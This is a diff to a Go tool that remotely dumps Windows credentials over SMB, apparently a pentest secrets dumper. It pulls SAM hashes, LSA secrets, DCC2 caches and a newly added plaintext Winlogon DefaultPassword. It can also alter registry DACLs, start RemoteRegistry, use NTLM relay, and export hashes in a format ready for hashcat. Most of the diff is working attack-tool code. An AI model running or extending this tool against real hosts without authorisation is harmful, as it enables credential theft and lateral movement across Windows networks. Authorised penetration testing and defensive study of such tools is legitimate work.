@@ -25,12 +25,14 @@ import (
 	"bufio"
 	"context"
 	"encoding/hex"
+	"encoding/json"
 	"flag"
 	"fmt"
 	"io"
 	"math/rand"
 	"net"
 	"os"
+	"sort"
 	"strconv"
 	"strings"
 	"time"
@@ -45,14 +47,14 @@ import (
 	"github.com/jfjallid/go-smb/dcerpc/msscmr"
 	"github.com/jfjallid/go-smb/dcerpc/smbtransport"
 	"github.com/jfjallid/go-smb/msdtyp"
+	"github.com/jfjallid/go-smb/relay"
 	"github.com/jfjallid/go-smb/smb"
-	"github.com/jfjallid/go-smb/smb/encoder"
 	"github.com/jfjallid/go-smb/spnego"
 	"github.com/jfjallid/golog"
 )
 
-var log = golog.Get("")
-var release string = "0.6.0"
+var log = golog.Get("main")
+var release string = "0.7.0"
 
 var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
 
@@ -68,6 +70,7 @@ var originalDacls map[string]*msdtyp.SecurityDescriptor
 var samSecretList = []printableSecret{}
 var lsaSecretList = []printableSecret{}
 var dcc2SecretList = []printableSecret{}
+var registrySecretList = []printableSecret{}
 
 var daclBackupFile *os.File
 var outputFile *os.File
@@ -109,6 +112,21 @@ func (s *printableLSASecret) printSecret(out io.Writer) {
 	}
 	if s.extraSecret != "" {
 		fmt.Fprintln(out, s.extraSecret)
+	}
+}
+
+type registrySecret struct {
+	kind   string
+	name   string
+	secret string
+}
+
+func (d *registrySecret) printSecret(out io.Writer) {
+	switch d.kind {
+	case "winlogon":
+		fmt.Fprintf(out, "Default Password: (user: %s, pass: %s)\n", d.name, d.secret)
+	default:
+		fmt.Fprintf(out, "Registry Secret: (name: %s, secret: %s)\n", d.name, d.secret)
 	}
 }
 
@@ -171,7 +189,8 @@ func startRemoteRegistry(session *smb.Connection, share string) (started, disabl
 	if config.StartType == msscmr.StartTypeStatusMap[msscmr.ServiceDisabled] {
 		disabled = true
 		// Enable service
-		err = rpccon.ChangeServiceConfig(serviceName, msscmr.ServiceNoChange, msscmr.ServiceDemandStart, msscmr.ServiceNoChange, "", "", "", "", "", "", 0)
+		var nilStr *string
+		err = rpccon.ChangeServiceConfig(serviceName, msscmr.ServiceNoChange, msscmr.ServiceDemandStart, msscmr.ServiceNoChange, nilStr, nilStr, "", nilStr, nilStr, "", 0)
 		if err != nil {
 			log.Errorf("Failed to change service config from Disabled to Start on Demand with error: %v\n", err)
 			return started, disabled, err
@@ -220,7 +239,8 @@ func stopRemoteRegistry(session *smb.Connection, share string, disable bool) (er
 	log.Infoln("Service RemoteRegistry stopped")
 
 	if disable {
-		err = rpccon.ChangeServiceConfig(serviceName, msscmr.ServiceNoChange, msscmr.ServiceDisabled, msscmr.ServiceNoChange, "", "", "", "", "", "", 0)
+		var nilStr *string
+		err = rpccon.ChangeServiceConfig(serviceName, msscmr.ServiceNoChange, msscmr.ServiceDisabled, msscmr.ServiceNoChange, nilStr, nilStr, "", nilStr, nilStr, "", 0)
 		if err != nil {
 			log.Errorf("Failed to change service config to Disabled with error: %v\n", err)
 			return
@@ -275,16 +295,16 @@ func changeDacl(rpccon *msrrp.RPCCon, base []byte, keys []string, sid string) er
 		if _, ok := originalDacls[subkey]; !ok {
 			originalDacls[subkey] = sd
 			if daclBackupFile != nil {
-				// Save new SD file
-				sdBytes, err := encoder.Marshal(sd)
+				// Persist the SD using the same MarshalBinary wire format that
+				// restoreDaclFromBackup expects (it calls UnmarshalBinary).
+				// sdBytes was already produced by sd.MarshalBinary() above.
+				// NOTE: encoder.Marshal can't be used here - it panics on the
+				// SID's Authority [6]byte field (go-smb's generic encoder type
+				// asserts []uint8 for both slices and fixed arrays).
+				sdHexBytes := hex.EncodeToString(sdBytes)
+				_, err = daclBackupFile.WriteString(fmt.Sprintf("%s:%s\n", subkey, sdHexBytes))
 				if err != nil {
-					log.Errorf("Failed to marshal SecurityDescriptor to bytes with error: %s\n", err)
-				} else {
-					sdHexBytes := hex.EncodeToString(sdBytes)
-					_, err = daclBackupFile.WriteString(fmt.Sprintf("%s:%s\n", subkey, sdHexBytes))
-					if err != nil {
-						log.Errorf("Failed to write DACL to file with error: %s\n", err)
-					}
+					log.Errorf("Failed to write DACL to file with error: %s\n", err)
 				}
 			}
 
@@ -337,6 +357,13 @@ func revertDacl(rpccon *msrrp.RPCCon, base []byte, keys []string) error {
 
 		sd.Control &^= msdtyp.SecurityDescriptorFlagSP
 		sd.OffsetSacl = 0
+		// MarshalBinary (called inside SetKeySecurity) emits a SACL whenever
+		// sd.Sacl != nil, re-setting the SACL-present flag and offset. A live
+		// SD from GetKeySecurity has Sacl == nil, but an SD restored from a
+		// backup file carries a non-nil empty PACL, so without nil-ing it here
+		// the wire SD gains a spurious SACL and SetKeySecurity fails with
+		// ERROR_INVALID_PARAMETER. We only have WriteDacl, so drop it.
+		sd.Sacl = nil
 		sd.OwnerSid = nil
 		sd.GroupSid = nil
 		sd.OffsetOwner = 0
@@ -521,7 +548,7 @@ func dumpSAM(rpccon *msrrp.RPCCon, hKey []byte, modifyDacl bool) (err error) {
 	return nil
 }
 
-func dumpLSASecrets(rpccon *msrrp.RPCCon, hKey []byte, modifyDacl bool) (err error) {
+func dumpLSASecrets(rpccon *msrrp.RPCCon, hKey []byte, modifyDacl bool, history bool) (err error) {
 	keys := []string{
 		`SECURITY\Policy\Secrets`,
 		`SECURITY\Policy\Secrets\NL$KM`,
@@ -569,7 +596,7 @@ func dumpLSASecrets(rpccon *msrrp.RPCCon, hKey []byte, modifyDacl bool) (err err
 		}
 	}
 
-	lsaSecrets, err := GetLSASecrets(rpccon, hKey, false, modifyDacl)
+	lsaSecrets, err := GetLSASecrets(rpccon, hKey, history, modifyDacl)
 	if err != nil {
 		log.Noticeln("Failed to get lsa secrets")
 		log.Errorln(err)
@@ -640,6 +667,28 @@ func dumpDCC2Cache(rpccon *msrrp.RPCCon, hKey []byte, modifyDacl bool) error {
 	//	}
 	//}
 
+	return nil
+}
+
+func dumpWinLogonDefaultPassword(rpccon *msrrp.RPCCon, base []byte) error {
+	result, err := getDefaultLogonPasswordPlain(rpccon, base)
+	if err != nil {
+		log.Errorln(err)
+		return err
+	}
+	if result == "" {
+		// No DefaultPassword
+		return nil
+	}
+	// Try to get Default Username
+	username, err := getDefaultLogonName(rpccon, base)
+	if err != nil {
+		log.Errorln(err)
+	}
+	if username == "" {
+		username = "(Unknown user)"
+	}
+	registrySecretList = append(registrySecretList, &registrySecret{kind: "winlogon", name: username, secret: result})
 	return nil
 }
 
@@ -772,6 +821,8 @@ var helpMsg = `
           --sam                  Extract secrets from the SAM hive explicitly. Only other explicit targets are included.
           --lsa                  Extract LSA secrets explicitly. Only other explicit targets are included.
           --dcc2                 Extract DCC2 caches explicitly. Only other explicit targets are included.
+          --misc                 Extract misc registry secrets such as the Winlogon
+                                 DefaultPassword explicitly. Only other explicit targets are included.
           --modify-dacl          Change DACLs of reg keys before dump.
                                  Only required if keys cannot be opened using SeBackupPrivilege. (default false)
           --backup-dacl          Save original DACLs to disk before modification
@@ -787,16 +838,81 @@ var helpMsg = `
       -t, --timeout <duration>   Dial timeout in format 5s or 2m (default 5s)
           --noenc                Disable smb encryption
           --smb2                 Force smb 2.1
-          --debug                Enable debug logging
-          --verbose              Enable verbose logging
+          --debug                Enable debug logging. Bare --debug turns on every
+                                 registered package; --debug=msrrp,smb turns on only the
+                                 listed package-name suffixes (the '=' form is required
+                                 for the filter).
+          --verbose              Enable verbose logging. Same filter syntax as --debug.
+                                 --debug and --verbose may be combined with different
+                                 filters; a package targeted by both gets the higher level.
+          --list-log-packages    List the registered log package names that can be
+                                 targeted with --debug=<suffix> or --verbose=<suffix>,
+                                 then exit
       -o, --output <file>        Filename for writing results (default is stdout). Will append to file if it exists.
+          --output-format <fmt>  Output format: text (default), json, or hashcat
+          --history              Include historical (OldVal) LSA secrets in addition to current values
+      -q, --quiet                Suppress informational headers; print only secrets
       -v, --version              Show version
 `
 
+// logFlag is a comma-separated package-suffix filter that also remembers
+// whether the user passed the flag at all. IsBoolFlag is set so the bare
+// "--debug" and "--verbose" form parses (flag pkg then calls Set("true"))
+// — we treat "true" as "no filter, all packages on". A filter list requires
+// the "=" form, e.g. --debug=msrrp,smb, because IsBoolFlag stops the parser
+// from consuming the next positional token.
+type logFlag struct {
+	set    bool
+	values []string
+}
+
+func (d *logFlag) String() string { return strings.Join(d.values, ",") }
+
+func (d *logFlag) IsBoolFlag() bool { return true }
+
+func (d *logFlag) Set(s string) error {
+	d.set = true
+	d.values = nil
+	if s == "" || s == "true" {
+		return nil
+	}
+	for _, tok := range strings.Split(s, ",") {
+		if tok = strings.TrimSpace(tok); tok != "" {
+			d.values = append(d.values, tok)
+		}
+	}
+	return nil
+}
+
+// applyLogLevel bumps registered package loggers to level. An empty filter
+// matches every name returned by golog.Names(); a non-empty filter keeps only
+// names whose path suffix matches one of the tokens (see matchesAny).
+func applyLogLevel(level int, filter []string) {
+	flags := golog.LstdFlags | golog.Lshortfile
+	for _, name := range golog.Names() {
+		if len(filter) == 0 || matchesAny(name, filter) {
+			golog.Set(name, "", level, flags, nil, nil)
+		}
+	}
+}
+
+// matchesAny reports whether name equals any token or ends with "/"+token,
+// so "smb" hits ".../go-smb/smb" but not ".../go-smb" (ends in "/go-smb",
+// not "/smb") and not ".../smb/server" (ends in "/server").
+func matchesAny(name string, tokens []string) bool {
+	for _, t := range tokens {
+		if name == t || strings.HasSuffix(name, "/"+t) {
+			return true
+		}
+	}
+	return false
+}
+
 func main() {
-	var host, username, password, hash, domain, socksHost, backupFilename, outputFilename, targetIP, dcIP, aesKey, dnsHost string
+	var host, username, password, hash, domain, socksHost, backupFilename, outputFilename, targetIP, dcIP, aesKey, dnsHost, outputFormat string
 	var port, socksPort, relayPort int
-	var debug, noEnc, forceSMB2, localUser, dump, version, verbose, relay, noPass, sam, lsaSecrets, dcc2, modifyDacl, backupDacl, restoreDacl, kerberos, dnsTCP bool
+	var noEnc, forceSMB2, localUser, dump, version, doRelay, noPass, sam, lsaSecrets, dcc2, otherRegistrySecrets, modifyDacl, backupDacl, restoreDacl, kerberos, dnsTCP, history, quiet, listLogPackages bool
+	var debug, verbose logFlag
 	var dialTimeout time.Duration
 	var err error
 
@@ -815,8 +931,9 @@ func main() {
 	flag.StringVar(&domain, "domain", "", "")
 	flag.IntVar(&port, "P", 445, "")
 	flag.IntVar(&port, "port", 445, "")
-	flag.BoolVar(&debug, "debug", false, "")
-	flag.BoolVar(&verbose, "verbose", false, "")
+	flag.Var(&debug, "debug", "")
+	flag.Var(&verbose, "verbose", "")
+	flag.BoolVar(&listLogPackages, "list-log-packages", false, "")
 	flag.BoolVar(&noEnc, "noenc", false, "")
 	flag.BoolVar(&forceSMB2, "smb2", false, "")
 	flag.BoolVar(&localUser, "local", false, "")
@@ -825,7 +942,7 @@ func main() {
 	flag.DurationVar(&dialTimeout, "timeout", time.Second*5, "")
 	flag.BoolVar(&version, "v", false, "")
 	flag.BoolVar(&version, "version", false, "")
-	flag.BoolVar(&relay, "relay", false, "")
+	flag.BoolVar(&doRelay, "relay", false, "")
 	flag.IntVar(&relayPort, "relay-port", 445, "")
 	flag.StringVar(&socksHost, "socks-host", "", "")
 	flag.IntVar(&socksPort, "socks-port", 1080, "")
@@ -834,6 +951,7 @@ func main() {
 	flag.BoolVar(&sam, "sam", false, "")
 	flag.BoolVar(&lsaSecrets, "lsa", false, "")
 	flag.BoolVar(&dcc2, "dcc2", false, "")
+	flag.BoolVar(&otherRegistrySecrets, "misc", false, "")
 	flag.BoolVar(&modifyDacl, "modify-dacl", false, "")
 	flag.BoolVar(&backupDacl, "backup-dacl", false, "")
 	flag.BoolVar(&restoreDacl, "restore-dacl", false, "")
@@ -847,37 +965,43 @@ func main() {
 	flag.StringVar(&aesKey, "aes-key", "", "")
 	flag.StringVar(&dnsHost, "dns-host", "", "")
 	flag.BoolVar(&dnsTCP, "dns-tcp", false, "")
+	flag.BoolVar(&history, "history", false, "")
+	flag.BoolVar(&quiet, "q", false, "")
+	flag.BoolVar(&quiet, "quiet", false, "")
+	flag.StringVar(&outputFormat, "output-format", "text", "")
 
 	flag.Parse()
 
-	if debug {
-		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/spnego", "spnego", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/dcerpc", "dcerpc", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/dcerpc/msrrp", "msrrp", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/dcerpc/msscmr", "msscmr", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/krb5ssp", "krb5ssp", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
-		log.SetFlags(golog.LstdFlags | golog.Lshortfile)
-		log.SetLogLevel(golog.LevelDebug)
-	} else if verbose {
-		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/spnego", "spnego", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/dcerpc", "dcerpc", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/dcerpc/msrrp", "msrrp", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/dcerpc/msscmr", "msscmr", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/krb5ssp", "krb5ssp", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
-		log.SetFlags(golog.LstdFlags | golog.Lshortfile)
-		log.SetLogLevel(golog.LevelInfo)
-	} else {
-		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/spnego", "spnego", golog.LevelNotice, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/dcerpc", "dcerpc", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/dcerpc/msrrp", "msrrp", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/dcerpc/msscmr", "msscmr", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/krb5ssp", "krb5ssp", golog.LevelNotice, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
+	if listLogPackages {
+		// The package loggers are registered at import time, so golog.Names()
+		// here lists every logger this binary can target. The suffix of any of
+		// these names (a path segment) is what --debug=/--verbose= matches.
+		names := golog.Names()
+		sort.Strings(names)
+		fmt.Println("Registered log packages (target a name's suffix with --debug=<suffix> or --verbose=<suffix>):")
+		for _, name := range names {
+			fmt.Println(name)
+		}
+		return
+	}
+
+	// --debug and --verbose are not mutually exclusive: each may carry its own
+	// comma-separated package filter (e.g. --debug=msrrp,smb --verbose=main).
+	// Verbose is applied first and debug second so that any package targeted by
+	// both ends up at the higher level (LevelDebug > LevelInfo). A bare --debug
+	// or --verbose (empty filter) targets every registered package, so passing
+	// both bare is ambiguous and rejected.
+	if debug.set || verbose.set {
+		if debug.set && verbose.set && len(debug.values) == 0 && len(verbose.values) == 0 {
+			fmt.Println("Cannot enable both --debug and --verbose for all packages at once. Specify just one of them, or be more granular e.g. --debug=msrrp,smb --verbose=main")
+			return
+		}
+		if verbose.set {
+			applyLogLevel(golog.LevelInfo, verbose.values)
+		}
+		if debug.set {
+			applyLogLevel(golog.LevelDebug, debug.values)
+		}
 	}
 
 	if version {
@@ -892,11 +1016,23 @@ func main() {
 		return
 	}
 
-	if !sam && !lsaSecrets && !dcc2 {
+	if !sam && !lsaSecrets && !dcc2 && !otherRegistrySecrets {
 		// If no individual target to dump is set, dump everything
 		sam = true
 		lsaSecrets = true
 		dcc2 = true
+		otherRegistrySecrets = true
+	}
+
+	// Validate the output format early so a typo fails fast instead of silently
+	// falling through to text after the whole dump has run.
+	outputFormat = strings.ToLower(outputFormat)
+	switch outputFormat {
+	case "text", "json", "hashcat":
+	default:
+		fmt.Printf("Invalid --output-format %q. Valid values are: text, json, hashcat\n", outputFormat)
+		flag.Usage()
+		return
 	}
 
 	if backupDacl && restoreDacl {
@@ -1092,9 +1228,13 @@ func main() {
 	smbOptions.DialTimeout = dialTimeout
 	var session *smb.Connection
 
-	if relay {
-		smbOptions.RelayPort = relayPort
-		session, err = smb.NewRelayConnection(smbOptions)
+	if doRelay {
+		relayConf := relay.ClientConfig{
+			ListenAddr:      fmt.Sprintf(":%d", relayPort),
+			Target:          fmt.Sprintf("%s:445", targetIP),
+			UpstreamOptions: smbOptions,
+		}
+		session, _, err = relay.RelayClient(relayConf)
 	} else {
 		session, err = smb.NewConnection(smbOptions)
 	}
@@ -1104,16 +1244,20 @@ func main() {
 	}
 	defer session.Close()
 
-	if session.IsSigningRequired() {
-		log.Noticeln("[-] Signing is required")
-	} else {
-		log.Noticeln("[+] Signing is NOT required")
+	if !quiet {
+		if session.IsSigningRequired() {
+			log.Noticeln("[-] Signing is required")
+		} else {
+			log.Noticeln("[+] Signing is NOT required")
+		}
 	}
 
 	if session.IsAuthenticated() {
-		log.Noticef("[+] Login successful as %s\n", session.GetAuthUsername())
+		if !quiet {
+			log.Noticef("[+] Login successful as %s\n", session.GetAuthUsername())
+		}
 	} else {
-		log.Noticeln("[-] Login failed")
+		log.Errorln("[-] Login failed")
 		return
 	}
 
@@ -1208,7 +1352,7 @@ func main() {
 			}
 		}
 		if lsaSecrets {
-			err = dumpLSASecrets(rpccon, hKey, modifyDacl)
+			err = dumpLSASecrets(rpccon, hKey, modifyDacl, history)
 			if err != nil {
 				log.Errorln(err)
 				return
@@ -1221,6 +1365,16 @@ func main() {
 				return
 			}
 		}
+		if otherRegistrySecrets {
+			// A failure to read the Winlogon key is non-fatal (the key may not
+			// exist or be unreadable); log and continue so that already-collected
+			// SAM/LSA/DCC2 secrets are still printed below.
+			err = dumpWinLogonDefaultPassword(rpccon, hKey)
+			if err != nil {
+				log.Errorf("Failed to dump Winlogon DefaultPassword (non-fatal): %s\n", err)
+				err = nil
+			}
+		}
 
 		// Print results
 		var out io.Writer
@@ -1229,24 +1383,123 @@ func main() {
 		} else {
 			out = os.Stdout
 		}
-		//TODO Write name of host?
-		if len(samSecretList) > 0 {
-			fmt.Fprintln(out, "[*] Dumping local SAM hashes")
+
+		if !quiet {
+			fmt.Fprintf(out, "[*] Target: %s\n", host)
+		}
+
+		switch outputFormat {
+		case "json":
+			type jsonRecord struct {
+				Type   string            `json:"type"`
+				Fields map[string]string `json:"fields"`
+			}
+			// Initialize as empty (not nil) so an empty result marshals to a
+			// valid JSON array `[]` rather than `null`.
+			records := []jsonRecord{}
+			for _, s := range samSecretList {
+				if acc, ok := s.(*samAccount); ok {
+					if acc.nthash == "<empty>" {
+						// Skip accounts without a password set
+						continue
+					}
+					records = append(records, jsonRecord{
+						Type: "sam",
+						Fields: map[string]string{
+							"name":   acc.name,
+							"rid":    strconv.FormatUint(uint64(acc.rid), 10),
+							"nthash": acc.nthash,
+						},
+					})
+				}
+			}
+			for _, s := range lsaSecretList {
+				if lsa, ok := s.(*printableLSASecret); ok {
+					fields := map[string]string{
+						"secret_type": strings.TrimPrefix(lsa.secretType, "[*] "),
+					}
+					for i, sec := range lsa.secrets {
+						fields[fmt.Sprintf("secret_%d", i)] = sec
+					}
+					if lsa.extraSecret != "" {
+						fields["extra_secret"] = lsa.extraSecret
+					}
+					records = append(records, jsonRecord{Type: "lsa", Fields: fields})
+				}
+			}
+			for _, s := range dcc2SecretList {
+				if dcc, ok := s.(*dcc2Cache); ok {
+					records = append(records, jsonRecord{
+						Type: "dcc2",
+						Fields: map[string]string{
+							"domain": dcc.domain,
+							"user":   dcc.user,
+							"cache":  dcc.cache,
+						},
+					})
+				}
+			}
+			for _, s := range registrySecretList {
+				if regSecret, ok := s.(*registrySecret); ok {
+					records = append(records, jsonRecord{
+						Type: "other",
+						Fields: map[string]string{
+							"kind":   regSecret.kind,
+							"name":   regSecret.name,
+							"secret": regSecret.secret,
+						},
+					})
+				}
+			}
+			jsonBytes, err := json.MarshalIndent(records, "", "  ")
+			if err != nil {
+				log.Errorln(err)
+				return
+			}
+			fmt.Fprintln(out, string(jsonBytes))
+
+		case "hashcat":
+			for _, s := range samSecretList {
+				if acc, ok := s.(*samAccount); ok && acc.nthash != "<empty>" {
+					fmt.Fprintln(out, acc.nthash)
+				}
+			}
+			for _, s := range dcc2SecretList {
+				if dcc, ok := s.(*dcc2Cache); ok {
+					fmt.Fprintln(out, dcc.cache)
+				}
+			}
+
+		default: // "text"
+			if !quiet && len(samSecretList) > 0 {
+				fmt.Fprintln(out, "[*] Dumping local SAM hashes")
+			}
 			for i := range samSecretList {
 				samSecretList[i].printSecret(out)
 			}
-		}
-		if len(lsaSecretList) > 0 {
-			fmt.Fprintln(out, "[*] Dumping LSA Secrets")
+			if !quiet && len(lsaSecretList) > 0 {
+				fmt.Fprintln(out, "[*] Dumping LSA Secrets")
+			}
 			for i := range lsaSecretList {
 				lsaSecretList[i].printSecret(out)
 			}
-		}
-		if len(dcc2SecretList) > 0 {
-			fmt.Fprintln(out, "[*] Dumping cached domain credentials (domain/username:hash)")
+			if !quiet && len(dcc2SecretList) > 0 {
+				fmt.Fprintln(out, "[*] Dumping cached domain credentials (domain/username:hash)")
+			}
 			for i := range dcc2SecretList {
 				dcc2SecretList[i].printSecret(out)
 			}
+			if !quiet && len(registrySecretList) > 0 {
+				fmt.Fprintln(out, "[*] Dumping other registry secrets")
+			}
+			for i := range registrySecretList {
+				registrySecretList[i].printSecret(out)
+			}
+		}
+
+		if !quiet {
+			fmt.Fprintf(out, "[*] Summary: %d SAM hash(es), %d LSA secret(s), %d DCC2 cache(s), %d registry secret(s) dumped\n",
+				len(samSecretList), len(lsaSecretList), len(dcc2SecretList), len(registrySecretList))
 		}
 	}
 }
